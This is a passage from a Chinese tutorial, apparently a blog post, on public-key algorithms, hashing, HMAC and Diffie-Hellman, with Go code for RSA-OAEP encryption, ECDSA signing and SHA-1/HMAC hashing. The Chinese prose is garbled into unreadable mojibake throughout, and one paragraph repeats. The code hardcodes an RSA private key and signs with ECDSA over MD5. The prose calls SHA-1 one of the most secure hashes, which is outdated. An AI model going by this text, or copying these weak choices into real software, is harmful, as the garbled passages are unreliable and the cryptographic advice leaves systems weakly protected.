plainText)&#125; éå¯¹ç§°ç®—æ³•éå¯¹ç§°åŠ å¯†ç®—æ³•å¸¸ç”¨äºæ•°æ®åŠ å¯†å’Œèº«ä»½è®¤è¯, å¸¸è§çš„éå¯¹ç§°åŠ å¯†ç®—æ³•å¦‚ä¸‹ï¼š RSA: ç”±RSAå…¬å¸å‘æ˜ï¼Œæ˜¯ä¸€ä¸ªæ”¯æŒå˜é•¿å¯†é’¥çš„å…¬å…±å¯†é’¥ç®—æ³•ï¼Œéœ€è¦åŠ å¯†çš„æ–‡ä»¶å—çš„é•¿åº¦ä¹Ÿæ˜¯å¯å˜çš„ï¼› DSA(Digital Signature Algorithm): æ•°å­—ç­¾åç®—æ³•ï¼Œæ˜¯ä¸€ç§æ ‡å‡†çš„DSS(æ•°å­—ç­¾åæ ‡å‡†)ï¼› ECC(Elliptic Curves Cryptography): æ¤­åœ†æ›²çº¿å¯†ç ç¼–ç å­¦ã€‚ ECDSA(Elliptic Curve Digital Signature Algorithm): åŸºäºæ¤­åœ†æ›²çº¿çš„DSAç­¾åç®—æ³• DSADSAæ˜¯åŸºäºæ•´æ•°æœ‰é™åŸŸç¦»æ•£å¯¹æ•°éš¾é¢˜çš„ï¼Œå…¶å®‰å…¨æ€§ä¸RSAç›¸æ¯”å·®ä¸å¤šã€‚DSAçš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹æ˜¯ä¸¤ä¸ªç´ æ•°å…¬å¼€ï¼Œè¿™æ ·ï¼Œå½“ä½¿ç”¨åˆ«äººçš„på’Œqæ—¶ï¼Œå³ä½¿ä¸çŸ¥é“ç§é’¥ï¼Œä½ ä¹Ÿèƒ½ç¡®è®¤å®ƒä»¬æ˜¯å¦æ˜¯éšæœºäº§ç”Ÿçš„ï¼Œè¿˜æ˜¯ä½œäº†æ‰‹è„šã€‚RSAç®—æ³•å´åšä¸åˆ°ä½†æ˜¯å…¶ç¼ºç‚¹å°±æ˜¯åªèƒ½ç”¨äºæ•°å­—ç­¾å, ä¸èƒ½ç”¨äºåŠ å¯†ã€‚ RSAåœ¨1976å¹´ï¼Œç”±äºå¯¹ç§°åŠ å¯†ç®—æ³•å·²ç»ä¸èƒ½æ»¡è¶³éœ€è¦ï¼ŒDiffie å’ŒHellmanå‘è¡¨äº†ä¸€ç¯‡å«ã€Šå¯†ç å­¦æ–°åŠ¨å‘ã€‹çš„æ–‡ç« ï¼Œä»‹ç»äº†å…¬åŒ™åŠ å¯†çš„æ¦‚å¿µï¼Œç”±Rivetã€Shamirã€Adelmanæå‡ºäº†RSAç®—æ³•ã€‚RSAæ˜¯ç›®å‰æœ€æœ‰å½±å“åŠ›çš„å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œå®ƒèƒ½å¤ŸæŠµæŠ—åˆ°ç›®å‰ä¸ºæ­¢å·²çŸ¥çš„ç»å¤§å¤šæ•°å¯†ç æ”»å‡»ï¼Œå·²è¢«ISOæ¨èä¸ºå…¬é’¥æ•°æ®åŠ å¯†æ ‡å‡†ã€‚ ECCECCåŠ å¯†çš„åŸç†ä¾èµ–æ¤­åœ†æ›²çº¿ä¸Šçš„éš¾é¢˜ã€‚ä»Šå¤©åªæœ‰çŸ­çš„RSAé’¥åŒ™æ‰å¯èƒ½è¢«å¼ºåŠ›æ–¹å¼è§£ç ´ã€‚åˆ°2008å¹´ä¸ºæ­¢ï¼Œä¸–ç•Œä¸Šè¿˜æ²¡æœ‰ä»»ä½•å¯é çš„æ”»å‡»RSAç®—æ³•çš„æ–¹å¼ã€‚åªè¦å…¶é’¥åŒ™çš„é•¿åº¦è¶³å¤Ÿé•¿ï¼Œç”¨RSAåŠ å¯†çš„ä¿¡æ¯å®é™…ä¸Šæ˜¯ä¸èƒ½è¢«è§£ç ´çš„ã€‚ä½†åœ¨åˆ†å¸ƒå¼è®¡ç®—å’Œé‡å­è®¡ç®—æœºç†è®ºæ—¥è¶‹æˆç†Ÿçš„ä»Šå¤©ï¼ŒRSAåŠ å¯†å®‰å…¨æ€§å—åˆ°äº†æŒ‘æˆ˜ã€‚éšç€åˆ†è§£å¤§æ•´æ•°æ–¹æ³•çš„è¿›æ­¥åŠå®Œå–„ã€è®¡ç®—æœºé€Ÿåº¦çš„æé«˜ä»¥åŠè®¡ç®—æœºç½‘ç»œçš„å‘å±•ï¼Œä¸ºäº†ä¿éšœæ•°æ®çš„å®‰å…¨ï¼ŒRSAçš„å¯†é’¥éœ€è¦ä¸æ–­å¢åŠ ï¼Œä½†æ˜¯ï¼Œå¯†é’¥é•¿åº¦çš„å¢åŠ å¯¼è‡´äº†å…¶åŠ è§£å¯†çš„é€Ÿåº¦å¤§ä¸ºé™ä½ï¼Œç¡¬ä»¶å®ç°ä¹Ÿå˜å¾—è¶Šæ¥è¶Šéš¾ä»¥å¿å—ï¼Œè¿™å¯¹ä½¿ç”¨RSAçš„åº”ç”¨å¸¦æ¥äº†å¾ˆé‡çš„è´Ÿæ‹…ï¼Œå› æ­¤éœ€è¦ä¸€ç§æ–°çš„ç®—æ³•æ¥ä»£æ›¿RSAã€‚1985å¹´N.Koblitzå’ŒMilleræå‡ºå°†æ¤­åœ†æ›²çº¿ç”¨äºå¯†ç ç®—æ³•ï¼Œæ ¹æ®æ˜¯æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹ç¾¤ä¸­çš„ç¦»æ•£å¯¹æ•°é—®é¢˜ECDLPã€‚ECDLPæ˜¯æ¯”å› å­åˆ†è§£é—®é¢˜æ›´éš¾çš„é—®é¢˜ï¼Œå®ƒæ˜¯æŒ‡æ•°çº§çš„éš¾åº¦ã€‚ ECDSAå› ä¸ºåœ¨æ•°å­—ç­¾åçš„å®‰å…¨æ€§é«˜, åŸºäºECCçš„DSAæ›´é«˜, æ‰€ä»¥éå¸¸é€‚åˆæ•°å­—ç­¾åä½¿ç”¨åœºæ™¯, åœ¨SSH TLSæœ‰å¹¿æ³›ä½¿ç”¨, ECCæŠŠç¦»æ•£å¯¹æ•°å®‰å…¨æ€§é«˜å¾ˆå°‘, æ‰€ä»¥ECCåœ¨å®‰å…¨é¢†åŸŸä¼šæˆä¸ºä¸‹ä¸€ä¸ªæ ‡å‡†ã€‚ ECCä¸RSAçš„æ¯”è¾ƒECCå’ŒRSAç›¸æ¯”ï¼Œåœ¨è®¸å¤šæ–¹é¢éƒ½æœ‰å¯¹ç»å¯¹çš„ä¼˜åŠ¿ï¼Œä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹æ–¹é¢ï¼š æŠ—æ”»å‡»æ€§å¼ºã€‚ç›¸åŒçš„å¯†é’¥é•¿åº¦ï¼Œå…¶æŠ—æ”»å‡»æ€§è¦å¼ºå¾ˆå¤šå€ã€‚ è®¡ç®—é‡å°ï¼Œå¤„ç†é€Ÿåº¦å¿«ã€‚ECCæ€»çš„é€Ÿåº¦æ¯”RSAã€DSAè¦å¿«å¾—å¤šã€‚ å­˜å‚¨ç©ºé—´å ç”¨å°ã€‚ECCçš„å¯†é’¥å°ºå¯¸å’Œç³»ç»Ÿå‚æ•°ä¸RSAã€DSAç›¸æ¯”è¦å°å¾—å¤šï¼Œæ„å‘³ç€å®ƒæ‰€å çš„å­˜è´®ç©ºé—´è¦å°å¾—å¤šã€‚è¿™å¯¹äºåŠ å¯†ç®—æ³•åœ¨ICå¡ä¸Šçš„åº”ç”¨å…·æœ‰ç‰¹åˆ«é‡è¦çš„æ„ä¹‰ã€‚ å¸¦å®½è¦æ±‚ä½ã€‚å½“å¯¹é•¿æ¶ˆæ¯è¿›è¡ŒåŠ è§£å¯†æ—¶ï¼Œä¸‰ç±»å¯†ç ç³»ç»Ÿæœ‰ç›¸åŒçš„å¸¦å®½è¦æ±‚ï¼Œä½†åº”ç”¨äºçŸ­æ¶ˆæ¯æ—¶ECCå¸¦å®½è¦æ±‚å´ä½å¾—å¤šã€‚å¸¦å®½è¦æ±‚ä½ä½¿ECCåœ¨æ— çº¿ç½‘ç»œé¢†åŸŸå…·æœ‰å¹¿æ³›çš„åº”ç”¨å‰æ™¯ã€‚ ECCçš„è¿™äº›ç‰¹ç‚¹ä½¿å®ƒå¿…å°†å–ä»£RSAï¼Œæˆä¸ºé€šç”¨çš„å…¬é’¥åŠ å¯†ç®—æ³•ã€‚æ¯”å¦‚SETåè®®çš„åˆ¶å®šè€…å·²æŠŠå®ƒä½œä¸ºä¸‹ä¸€ä»£SETåè®®ä¸­ç¼ºçœçš„å…¬é’¥å¯†ç ç®—æ³•ã€‚ECCçš„è¿™äº›ç‰¹ç‚¹ä½¿å®ƒå¿…å°†å–ä»£RSAï¼Œæˆä¸ºé€šç”¨çš„å…¬é’¥åŠ å¯†ç®—æ³•ã€‚æ¯”å¦‚SETåè®®çš„åˆ¶å®šè€…å·²æŠŠå®ƒä½œä¸ºä¸‹ä¸€ä»£SETåè®®ä¸­ç¼ºçœçš„å…¬é’¥å¯†ç ç®—æ³•ã€‚ ä»£ç ç¤ºä¾‹ECCæ˜¯æœªæ¥çš„ä¸€ä¸ªè¶‹åŠ¿, åœ¨IOTè¡Œä¸šæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©, ä½†æ˜¯ç°åœ¨è¢«å¹¿æ³›ä½¿ç”¨çš„ä¾ç„¶æ˜¯RSAä»¥ä¸‹ä½¿ç”¨RSAè¿›è¡ŒåŠ è§£å¯†: ä½¿ç”¨å¯¹æ–¹çš„å…¬é’¥åŠ å¯†æ•°æ®, ç„¶åå‘ç»™å¯¹æ–¹, å¯¹æ–¹ä½¿ç”¨è‡ªå·±çš„ç§é’¥è§£å¯†.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495package mainimport ( "crypto/rand" "crypto/rsa" "crypto/sha1" "crypto/x509" "encoding/pem" "fmt")// ä½¿ç”¨å¯¹æ–¹çš„å…¬é’¥çš„æ•°æ®, åªæœ‰å¯¹æ–¹çš„ç§é’¥æ‰èƒ½è§£å¼€func encrypt(plain string, publicKey string) (cipherByte []byte, err error) &#123; msg := []byte(plain) // è§£ç å…¬é’¥ pubBlock, _ := pem.Decode([]byte(publicKey)) // è¯»å–å…¬é’¥ pubKeyValue, err := x509.ParsePKIXPublicKey(pubBlock.Bytes) if err != nil &#123; panic(err) &#125; pub := pubKeyValue.(*rsa.PublicKey) // åŠ å¯†æ•°æ®æ–¹æ³•: ä¸ç”¨ä½¿ç”¨EncryptPKCS1v15æ–¹æ³•åŠ å¯†,æºç é‡Œé¢æ¨èä½¿ç”¨EncryptOAEP, å› æ­¤è¿™é‡Œä½¿ç”¨å®‰å…¨çš„æ–¹æ³•åŠ å¯† encryptOAEP, err := rsa.EncryptOAEP(sha1.New(), rand.Reader, pub, msg, nil) if err != nil &#123; panic(err) &#125; cipherByte = encryptOAEP return&#125;// ä½¿ç”¨ç§é’¥è§£å¯†å…¬é’¥åŠ å¯†çš„æ•°æ®func decrypt(cipherByte []byte, privateKey string) (plainText string, err error) &#123; // è§£æå‡ºç§é’¥ priBlock, _ := pem.Decode([]byte(privateKey)) priKey, err := x509.ParsePKCS1PrivateKey(priBlock.Bytes) if err != nil &#123; panic(err) &#125; // è§£å¯†RSA-OAEPæ–¹å¼åŠ å¯†åçš„å†…å®¹ decryptOAEP, err := rsa.DecryptOAEP(sha1.New(), rand.Reader, priKey, cipherByte, nil) if err != nil &#123; panic(err) &#125; plainText = string(decryptOAEP) return&#125;func test() &#123; msg := "Content bo be encrypted!" // è·å–å…¬é’¥, ç”Ÿäº§ç¯å¢ƒå¾€å¾€æ˜¯æ–‡ä»¶ä¸­è¯»å–, è¿™é‡Œä¸ºäº†æµ‹è¯•æ–¹ä¾¿, ç›´æ¥ç”Ÿæˆäº†. publicKeyData := `-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZsfv1qscqYdy4vY+P4e3cAtmvppXQcRvrF1cB4drkv0haU24Y7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0DgacdwYWd/7PeCELyEipZJL07Vro7Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NLAUeJ6PeW+DAkmJWF6QIDAQAB-----END PUBLIC KEY-----` // è·å–ç§é’¥ privateKeyData := `-----BEGIN RSA PRIVATE KEY-----MIICXQIBAAKBgQDZsfv1qscqYdy4vY+P4e3cAtmvppXQcRvrF1cB4drkv0haU24Y7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0DgacdwYWd/7PeCELyEipZJL07Vro7Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NLAUeJ6PeW+DAkmJWF6QIDAQABAoGBAJlNxenTQj6OfCl9FMR2jlMJjtMrtQT9InQEE7m3m7bLHeC+MCJOhmNVBjaMZpthDORdxIZ6oCuOf6Z2+Dl35lntGFh5J7S34UP2BWzF1IyyQfySCNexGNHKT1G1XKQtHmtc2gWWthEg+S6ciIyw2IGrrP2Rke81vYHExPrexf0hAkEA9Izb0MiYsMCB/jemLJB0Lb3Y/B8xjGjQFFBQT7bmwBVjvZWZVpnMnXi9sWGdgUpxsCuAIROXjZ40IRZ2C9EouwJBAOPjPvV8Sgw4vaseOqlJvSq/C/pIFx6RVznDGlc8bRg7SgTPpjHG4G+M3mVgpCX1a/EU1mB+fhiJ2LAZ/pTtY6sCQGaW9NwIWu3DRIVGCSMm0mYh/3X9DAcwLSJoctiODQ1Fq9rreDE5QfpJnaJdJfsIJNtX1F+L3YceeBXtW0Ynz2MCQBI89KP274Is5FkWkUFNKnuKUK4WKOuEXEO+LpR+vIhs7k6WQ8nGDd4/mujoJBr5mkrwDPwqA3N5TMNDQVGv8gMCQQCaKGJgWYgvo3/milFfImbp+m7/Y3vCptarldXrYQWOAQjxwc71ZGBFDITYvdgJM1MTqc8xQek1FXn1vfpy2c6O-----END RSA PRIVATE KEY-----` cipherData, err := encrypt(msg, publicKeyData) if err != nil &#123; panic(err) &#125; fmt.Printf("encrypt message: %x\n", cipherData) plainData, err := decrypt(cipherData, privateKeyData) if err != nil &#123; panic(err) &#125; fmt.Printf("decrypt message:%s\n", plainData)&#125;func main() &#123; test()&#125; ecdsaæ­£åœ¨é€æ¸æˆä¸ºæ•°å­—ç­¾åçš„ä¸€ä¸ªæ ‡å‡†, åœ¨golangçš„sshåº“ä¸­å°±æ˜¯ä½¿ç”¨è¿™ä¸ªç®—æ³•æ¥ç­¾åçš„: Aä½¿ç”¨è‡ªå·±çš„ç§é’¥ç­¾åä¸€æ®µæ•°æ®, ç„¶åå°†å…¬é’¥å‘æ”¾å‡ºå». ç”¨æˆ·æ‹¿åˆ°å…¬é’¥å, éªŒè¯æ•°æ®çš„ç­¾å,å¦‚æœé€šè¿‡åˆ™è¯æ˜æ•°æ®æ¥æºæ˜¯A, ä»è€Œè¾¾åˆ°èº«ä»½è®¤è¯çš„ä½œç”¨.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package mainimport ( "crypto/ecdsa" "crypto/elliptic" "crypto/md5" "crypto/rand" "fmt" "hash" "io" "math/big")// SignData ç”¨äºä¿å­˜ç­¾åçš„æ•°æ®type SignData struct &#123; r *big.Int s *big.Int signhash *[]byte signature *[]byte&#125;// ä½¿ç”¨ç§é’¥ç­¾åä¸€æ®µæ•°æ®func sign(message string, privateKey *ecdsa.PrivateKey) (signData *SignData, err error) &#123; // ç­¾åæ•°æ® var h hash.Hash h = md5.New() r := big.NewInt(0) s := big.NewInt(0) io.WriteString(h, message) signhash := h.Sum(nil) r, s, serr := ecdsa.Sign(rand.Reader, privateKey, signhash) if serr != nil &#123; return nil, serr &#125; signature := r.Bytes() signature = append(signature, s.Bytes()...) signData = &amp;SignData&#123; r: r, s: s, signhash: &amp;signhash, signature: &amp;signature, &#125; return&#125;// æ ¡éªŒæ•°å­—ç­¾åfunc verifySign(signData *SignData, publicKey *ecdsa.PublicKey) (status bool) &#123; status = ecdsa.Verify(publicKey, *signData.signhash, signData.r, signData.s) return&#125;func test() &#123; //ä½¿ç”¨æ¤­åœ†æ›²çº¿çš„P256ç®—æ³•,ç°åœ¨ä¸€å…±ä¹Ÿå°±å®ç°äº†4ç§,æˆ‘ä»¬ä½¿ç”¨æŠ˜ä¸­ä¸€ç§,å…·ä½“è§http://golang.org/pkg/crypto/elliptic/#P256 pubkeyCurve := elliptic.P256() privateKey := new(ecdsa.PrivateKey) // ç”Ÿæˆç§˜é’¥å¯¹ privateKey, err := ecdsa.GenerateKey(pubkeyCurve, rand.Reader) if err != nil &#123; panic(err) &#125; var publicKey ecdsa.PublicKey publicKey = privateKey.PublicKey // ç­¾å signData, err := sign("This is a message to be signed and verified by ECDSA!", privateKey) if err != nil &#123; panic(err) &#125; fmt.Printf("The signhash: %x\nThe signature: %x\n", *signData.signhash, *signData.signature) // éªŒè¯ status := verifySign(signData, &amp;publicKey) fmt.Printf("The verify result is: %v\n", status)&#125;func main() &#123; test()&#125; æ•£åˆ—ç®—æ³•æ•£åˆ—æ˜¯ä¿¡æ¯çš„æç‚¼ï¼Œé€šå¸¸å…¶é•¿åº¦è¦æ¯”ä¿¡æ¯å°å¾—å¤šï¼Œä¸”ä¸ºä¸€ä¸ªå›ºå®šé•¿åº¦ã€‚åŠ å¯†æ€§å¼ºçš„æ•£åˆ—ä¸€å®šæ˜¯ä¸å¯é€†çš„ï¼Œè¿™å°±æ„å‘³ç€é€šè¿‡æ•£åˆ—ç»“æœï¼Œæ— æ³•æ¨å‡ºä»»ä½•éƒ¨åˆ†çš„åŸå§‹ä¿¡æ¯ã€‚ä»»ä½•è¾“å…¥ä¿¡æ¯çš„å˜åŒ–ï¼Œå“ªæ€•ä»…ä¸€ä½ï¼Œéƒ½å°†å¯¼è‡´æ•£åˆ—ç»“æœçš„æ˜æ˜¾å˜åŒ–ï¼Œè¿™ç§°ä¹‹ä¸ºé›ªå´©æ•ˆåº”ã€‚æ•£åˆ—è¿˜åº”è¯¥æ˜¯é˜²å†²çªçš„ï¼Œå³æ‰¾ä¸å‡ºå…·æœ‰ç›¸åŒæ•£åˆ—ç»“æœçš„ä¸¤æ¡ä¿¡æ¯ã€‚å…·æœ‰è¿™äº›ç‰¹æ€§çš„æ•£åˆ—ç»“æœå°±å¯ä»¥ç”¨äºéªŒè¯ä¿¡æ¯æ˜¯å¦è¢«ä¿®æ”¹ã€‚å¸¸ç”¨äºä¿è¯æ•°æ®å®Œæ•´æ€§å•å‘æ•£åˆ—å‡½æ•°ä¸€èˆ¬ç”¨äºäº§ç”Ÿæ¶ˆæ¯æ‘˜è¦ï¼Œå¯†é’¥åŠ å¯†ç­‰ï¼Œå¸¸è§çš„æœ‰ï¼š MD5(Message Digest Algorithm 5): æ˜¯RSAæ•°æ®å®‰å…¨å…¬å¸å¼€å‘çš„ä¸€ç§å•å‘æ•£åˆ—ç®—æ³•ã€‚ SHA(Secure Hash Algorithm): å¯ä»¥å¯¹ä»»æ„é•¿åº¦çš„æ•°æ®è¿ç®—ç”Ÿæˆä¸€ä¸ª160ä½çš„æ•°å€¼ï¼› MD5MD5å³Message-Digest Algorithm 5ï¼ˆä¿¡æ¯-æ‘˜è¦ç®—æ³•5ï¼‰ï¼Œç”¨äºç¡®ä¿ä¿¡æ¯ä¼ è¾“å®Œæ•´ä¸€è‡´ã€‚æ˜¯è®¡ç®—æœºå¹¿æ³›ä½¿ç”¨çš„æ‚å‡‘ç®—æ³•ä¹‹ä¸€ï¼ˆåˆè¯‘æ‘˜è¦ç®—æ³•ã€å“ˆå¸Œç®—æ³•ï¼‰ï¼Œä¸»æµç¼–ç¨‹è¯­è¨€æ™®éå·²æœ‰MD5å®ç°ã€‚å°†æ•°æ®ï¼ˆå¦‚æ±‰å­—ï¼‰è¿ç®—ä¸ºå¦ä¸€å›ºå®šé•¿åº¦å€¼ï¼Œæ˜¯æ‚å‡‘ç®—æ³•çš„åŸºç¡€åŸç†ï¼ŒMD5çš„å‰èº«æœ‰MD2ã€MD3å’ŒMD4 SHA-1åœ¨1993å¹´ï¼Œå®‰å…¨æ•£åˆ—ç®—æ³•ï¼ˆSHAï¼‰ç”±ç¾å›½å›½å®¶æ ‡å‡†å’ŒæŠ€æœ¯åä¼š(NIST)æå‡ºï¼Œå¹¶ä½œä¸ºè”é‚¦ä¿¡æ¯å¤„ç†æ ‡å‡†ï¼ˆFIPS PUB 180ï¼‰å…¬å¸ƒï¼›1995å¹´åˆå‘å¸ƒäº†ä¸€ä¸ªä¿®è®¢ç‰ˆFIPS PUB 180-1ï¼Œé€šå¸¸ç§°ä¹‹ä¸ºSHA-1ã€‚SHA-1æ˜¯åŸºäºMD4ç®—æ³•çš„ï¼Œå¹¶ä¸”å®ƒçš„è®¾è®¡åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯æ¨¡ä»¿MD4çš„ã€‚ç°åœ¨å·²æˆä¸ºå…¬è®¤çš„æœ€å®‰å…¨çš„æ•£åˆ—ç®—æ³•ä¹‹ä¸€ï¼Œå¹¶è¢«å¹¿æ³›ä½¿ç”¨ã€‚SHA-1æ˜¯ä¸€ç§æ•°æ®åŠ å¯†ç®—æ³•ï¼Œè¯¥ç®—æ³•çš„æ€æƒ³æ˜¯æ¥æ”¶ä¸€æ®µæ˜æ–‡ï¼Œç„¶åä»¥ä¸€ç§ä¸å¯é€†çš„æ–¹å¼å°†å®ƒè½¬æ¢æˆä¸€æ®µï¼ˆé€šå¸¸æ›´å°ï¼‰å¯†æ–‡ï¼Œä¹Ÿå¯ä»¥ç®€å•çš„ç†è§£ä¸ºå–ä¸€ä¸²è¾“å…¥ç ï¼ˆç§°ä¸ºé¢„æ˜ å°„æˆ–ä¿¡æ¯ï¼‰ï¼Œå¹¶æŠŠå®ƒä»¬è½¬åŒ–ä¸ºé•¿åº¦è¾ƒçŸ­ã€ä½æ•°å›ºå®šçš„è¾“å‡ºåºåˆ—å³æ•£åˆ—å€¼ï¼ˆä¹Ÿç§°ä¸ºä¿¡æ¯æ‘˜è¦æˆ–ä¿¡æ¯è®¤è¯ä»£ç ï¼‰çš„è¿‡ç¨‹ã€‚è¯¥ç®—æ³•è¾“å…¥æŠ¥æ–‡çš„æœ€å¤§é•¿åº¦ä¸è¶…è¿‡264ä½ï¼Œäº§ç”Ÿçš„è¾“å‡ºæ˜¯ä¸€ä¸ª160ä½çš„æŠ¥æ–‡æ‘˜è¦ã€‚è¾“å…¥æ˜¯æŒ‰512 ä½çš„åˆ†ç»„è¿›è¡Œå¤„ç†çš„ã€‚SHA-1æ˜¯ä¸å¯é€†çš„ã€é˜²å†²çªï¼Œå¹¶å…·æœ‰è‰¯å¥½çš„é›ªå´©æ•ˆåº”ã€‚sha1æ˜¯SHAå®¶æ—çš„äº”ä¸ªç®—æ³•ä¹‹ä¸€(å…¶å®ƒå››ä¸ªæ˜¯SHA-224ã€SHA-256ã€SHA-384ï¼Œå’ŒSHA-512) HMacHmacç®—æ³•ä¹Ÿæ˜¯ä¸€ç§å“ˆå¸Œç®—æ³•ï¼Œå®ƒå¯ä»¥åˆ©ç”¨MD5æˆ–SHA1ç­‰å“ˆå¸Œç®—æ³•ã€‚ä¸åŒçš„æ˜¯ï¼ŒHmacè¿˜éœ€è¦ä¸€ä¸ªå¯†é’¥, åªè¦å¯†é’¥å‘ç”Ÿäº†å˜åŒ–ï¼Œé‚£ä¹ˆåŒæ ·çš„è¾“å…¥æ•°æ®ä¹Ÿä¼šå¾—åˆ°ä¸åŒçš„ç­¾åï¼Œå› æ­¤ï¼Œå¯ä»¥æŠŠHmacç†è§£ä¸ºç”¨éšæœºæ•°â€œå¢å¼ºâ€çš„å“ˆå¸Œç®—æ³•ã€‚ SHA-1ä¸MD5çš„æ¯”è¾ƒå› ä¸ºäºŒè€…å‡ç”±MD4å¯¼å‡ºï¼ŒSHA-1å’ŒMD5å½¼æ­¤å¾ˆç›¸ä¼¼ã€‚ç›¸åº”çš„ï¼Œä»–ä»¬çš„å¼ºåº¦å’Œå…¶ä»–ç‰¹æ€§ä¹Ÿæ˜¯ç›¸ä¼¼ï¼Œä½†è¿˜æœ‰ä»¥ä¸‹å‡ ç‚¹ä¸åŒï¼š å¯¹å¼ºè¡Œä¾›ç»™çš„å®‰å…¨æ€§ï¼šæœ€æ˜¾è‘—å’Œæœ€é‡è¦çš„åŒºåˆ«æ˜¯SHA-1æ‘˜è¦æ¯”MD5æ‘˜è¦é•¿32 ä½ã€‚ä½¿ç”¨å¼ºè¡ŒæŠ€æœ¯ï¼Œäº§ç”Ÿä»»ä½•ä¸€ä¸ªæŠ¥æ–‡ä½¿å…¶æ‘˜è¦ç­‰äºç»™å®šæŠ¥æ‘˜è¦çš„éš¾åº¦å¯¹MD5æ˜¯2128æ•°é‡çº§çš„æ“ä½œï¼Œè€Œå¯¹SHA-1åˆ™æ˜¯2160æ•°é‡çº§çš„æ“ä½œã€‚è¿™æ ·ï¼ŒSHA-1å¯¹å¼ºè¡Œæ”»å‡»æœ‰æ›´å¤§çš„å¼ºåº¦ã€‚ å¯¹å¯†ç åˆ†æçš„å®‰å…¨æ€§ï¼šç”±äºMD5çš„è®¾è®¡ï¼Œæ˜“å—å¯†ç åˆ†æçš„æ”»å‡»ï¼ŒSHA-1æ˜¾å¾—ä¸æ˜“å—è¿™æ ·çš„æ”»å‡»ã€‚ é€Ÿåº¦ï¼šåœ¨ç›¸åŒçš„ç¡¬ä»¶ä¸Šï¼ŒSHA-1çš„è¿è¡Œé€Ÿåº¦æ¯”MD5æ…¢ã€‚ ä»£ç ç¤ºä¾‹ç”±äºMD5å·²ç»è¢«ç ´è§£äº†(ä¸­å›½å±±ä¸œå¤§å­¦çš„ç‹å°äº‘æ•™æˆç ´è§£), å¸¸ç”¨çš„æ•£åˆ—ç®—æ³•æ˜¯shaå®¶æ—, æ›´åŠ å®‰å…¨çš„ç®—æ³•æ˜¯ä½¿ç”¨Hmac123456789101112131415161718192021222324252627282930313233343536package mainimport ( "crypto/hmac" "crypto/sha1" "fmt" "io")// sha1æ•£åˆ—ç®—æ³•func sha1Hash(msg string) (hashData []byte) &#123; h := sha1.New() io.WriteString(h, msg) hashData = h.Sum(nil) return&#125;// ä½¿ç”¨sha1çš„Hmacæ•£åˆ—ç®—æ³•func hmacHash(msg string, key string) (hashData []byte) &#123; k := []byte(key) mac := hmac.New(sha1.New, k) io.WriteString(mac, msg) hashData = mac.Sum(nil) return&#125;func main() &#123; msg := "This is the message to hash!" // sha1 sha1Data := sha1Hash(msg) fmt.Printf("SHA1: %x\n", sha1Data) // hmac hmacData := hmacHash(msg, "The key string!") fmt.Printf("HMAC: %x\n", hmacData)&#125; ç§˜é’¥äº¤æ¢ç®—æ³•ä¸€ç§å¯†é’¥äº¤æ¢åè®®ï¼Œæ³¨æ„è¯¥ç®—æ³•åªèƒ½ç”¨äºå¯†é’¥çš„äº¤æ¢ï¼Œè€Œä¸èƒ½è¿›è¡Œæ¶ˆæ¯çš„åŠ å¯†å’Œè§£å¯†ã€‚åŒæ–¹ç¡®å®šè¦ç”¨çš„å¯†é’¥åï¼Œè¦ä½¿ç”¨å…¶ä»–å¯¹ç§°å¯†é’¥æ“ä½œåŠ å¯†ç®—æ³•å®é™…åŠ å¯†å’Œè§£å¯†æ¶ˆæ¯ã€‚å®ƒå¯ä»¥è®©åŒæ–¹åœ¨ä¸æ³„æ¼å¯†é’¥çš„æƒ…å†µä¸‹åå•†å‡ºä¸€ä¸ªå¯†é’¥æ¥, å¸¸ç”¨äºä¿è¯å¯¹ç§°åŠ å¯†çš„ç§˜é’¥çš„å®‰å…¨, TLSå°±æ˜¯è¿™æ ·åšçš„ã€‚åœ¨è¿™ä¸ªé¢†åŸŸåº”è¯¥2ç§ DHï¼šECDHæ˜¯DHçš„åŠ å¼ºç‰ˆ ECDH: DHç®—æ³•çš„åŠ å¼ºç‰ˆ, å¸¸ç”¨çš„æ˜¯NISTç³»åˆ—,ä½†æ˜¯åé¢curve25519 curve25519: å®è´¨ä¸Šä¹Ÿæ˜¯ä¸€ç§ECDH,ä½†æ˜¯å…¶å®ç°æ›´ä¸ºä¼˜ç§€,è¡¨ç°çš„æ›´ä¸ºå®‰å…¨,å¯èƒ½æ˜¯ä¸‹ä¸€ä»£ç§˜é’¥äº¤æ¢ç®—æ³•çš„æ ‡å‡†ã€‚ DHDHå…¨ç§°æ˜¯:Diffie-Hellman, æ˜¯ä¸€ç§ç¡®ä¿å…±äº«KEYå®‰å…¨ç©¿è¶Šä¸å®‰å…¨ç½‘ç»œçš„æ–¹æ³•ï¼Œå®ƒæ˜¯OAKLEYçš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ã€‚Whitefieldä¸Martin Hellmanåœ¨1976å¹´æå‡ºäº†ä¸€ä¸ªå¥‡å¦™çš„å¯†é’¥äº¤æ¢åè®®ï¼Œç§°ä¸ºDiffie-Hellmanå¯†é’¥äº¤æ¢åè®®/ç®—æ³•(Diffie-Hellman Key Exchange/Agreement Algorithm).è¿™ä¸ªæœºåˆ¶çš„å·§å¦™åœ¨äºéœ€è¦å®‰å…¨é€šä¿¡çš„åŒæ–¹å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ç¡®å®šå¯¹ç§°å¯†é’¥ã€‚ç„¶åå¯ä»¥ç”¨è¿™ä¸ªå¯†é’¥è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ã€‚DHä¾èµ–äºè®¡ç®—ç¦»æ•£å¯¹æ•°çš„éš¾åº¦, å¤§æ¦‚è¿‡ç¨‹å¦‚ä¸‹: 